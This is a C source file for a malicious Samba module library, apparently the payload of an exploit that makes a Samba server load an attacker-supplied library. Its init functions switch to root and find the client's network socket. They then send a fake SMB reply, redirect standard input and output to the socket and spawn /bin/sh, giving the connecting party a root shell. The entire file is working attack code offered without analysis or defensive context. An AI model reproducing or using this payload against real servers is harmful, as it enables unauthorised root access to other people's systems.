#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <signal.h>
#include <string.h>

#ifdef OLD_LIB_SET_1
__asm__(".symver execve,execve@GLIBC_2.0");
__asm__(".symver dup2,dup2@GLIBC_2.0");
__asm__(".symver getsockname,getsockname@GLIBC_2.0");
#endif

#ifdef OLD_LIB_SET_2
__asm__(".symver execve,execve@GLIBC_2.2.5");
__asm__(".symver dup2,dup2@GLIBC_2.2.5");
__asm__(".symver getsockname,getsockname@GLIBC_2.2.5");
#endif

extern bool change_to_root_user(void);

// Samba 4 looks for samba_init_module
int samba_init_module(void)
{
  char *args[2] = {"/bin/sh", 0};
  struct sockaddr_in sa;
  socklen_t sl = sizeof(sa);
  int s;
  unsigned char buff[] = {
    0x00, 0x00, 0x00, 0x23, 0xff, 0x53, 0x4d, 0x42,
    0xa2, 0x39, 0x00, 0x00, 0xc0, 0x88, 0x03, 0xc8,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x64, 0x7e,
    0x64, 0x00, 0x8c, 0x00, 0x00, 0x00, 0x00
  };

  change_to_root_user();

  for (s=4096; s>0; s--) {

    // Skip over invalid sockets
    if (getsockname(s, (struct sockaddr *)&sa, &sl) != 0)
      continue;

    // Skip over non internet sockets
    if (sa.sin_family != AF_INET)
      continue;

    // Send a semi-valid SMB response to simplify things
    send(s, buff, sizeof(buff), 0);

    // Duplicate standard input/output/error
    dup2(s, 0);
    dup2(s, 1);
    dup2(s, 2);

    execve(args[0], args, NULL);
  }

  return 0;
}

// Samba 3 looks for init_samba_module
int init_samba_module(void) {  return samba_init_module(); }
